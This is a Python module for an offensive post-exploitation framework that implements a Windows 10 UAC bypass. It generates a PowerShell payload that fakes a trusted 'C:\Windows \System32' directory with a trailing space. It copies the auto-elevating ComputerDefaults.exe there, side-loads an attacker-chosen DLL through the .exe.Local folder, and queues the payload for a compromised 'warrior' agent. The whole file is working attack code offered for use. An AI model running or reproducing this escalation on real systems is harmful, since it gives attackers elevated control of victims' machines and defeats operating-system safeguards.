from pathlib import Path

from termcolor import colored, cprint

from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "invoke-mockingtrusteddirectory",
                       "Description": "UAC bypass through Mocking Trusted Directory method (windows10)",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "dll": ["comctl32.dll", "DLL name", True],
                   "base": [None, "DLL path", True],
                   "common-control": ["amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17134.407_none_fb449d63306391e9", "DLL folder name", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):

        warrior_exist = False
        for p in Path("/tmp/").glob("ibs-*"):
            if str(p)[9:] == self.args["warrior"]:
                warrior_exist = True
                break

        if warrior_exist:
            function = """function invoke-mockingtrusteddirectory{{

if((Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").ProductName -like '*Windows 10*')
{{
  [System.io.directory]::CreateDirectory("\\\\?\\C:\\Windows \\")
  [System.io.directory]::CreateDirectory("C:\\Windows \\System32")
  [System.io.file]::Copy("C:\Windows\System32\ComputerDefaults.exe","C:\Windows \System32\ComputerDefaults.exe")
  [System.io.directory]::CreateDirectory("C:\\Windows \\System32\\ComputerDefaults.exe.Local")
  [System.io.directory]::CreateDirectory("C:\\Windows \\System32\\ComputerDefaults.exe.Local\\{0}")
  [System.io.file]::Copy("{1}\\{2}","C:\\Windows \\System32\\ComputerDefaults.exe.Local\\{0}\\{2}")
  Start-Process "C:\Windows \System32\ComputerDefaults.exe" 
}}

}}""".format(self.args["common-control"],self.args["base"],self.args["dll"])
            
            function += 'invoke-mockingtrusteddirectory'

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')

        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')
